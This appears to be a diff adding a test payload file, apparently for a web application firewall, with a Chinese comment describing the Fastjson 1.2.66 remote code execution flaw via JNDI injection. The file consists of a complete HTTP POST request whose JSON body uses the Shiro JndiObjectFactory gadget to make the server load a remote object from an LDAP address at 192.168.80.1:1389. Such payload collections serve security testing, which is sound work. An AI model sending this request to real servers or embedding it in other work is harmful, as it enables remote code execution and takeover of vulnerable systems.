@@ -1,0 +1,14 @@
+# Fastjson_1.2.66远程命令执行漏洞
+# 在1.2.66及之前版本中存在大量通过JNDI注入绕过黑名单限制的而导致远程代码执行漏洞，远程攻击者可以通过构造的攻击代码触发远程代码执行漏洞。
+POST /?acid=80025454&bid=hd_tag_m8mv261c HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv261c
+RM-PRO-Token: ed7cc0d33c04d358470093ea42956db8
+RM-PRO-Time: 1742808525088
+User-Agent: curl/7.83.1
+Content-Type: application/json
+
+{
+  "@type":"org.apache.shiro.jndi.JndiObjectFactory",
+  "resourceName":"ldap://192.168.80.1:1389/Calc"
+  }
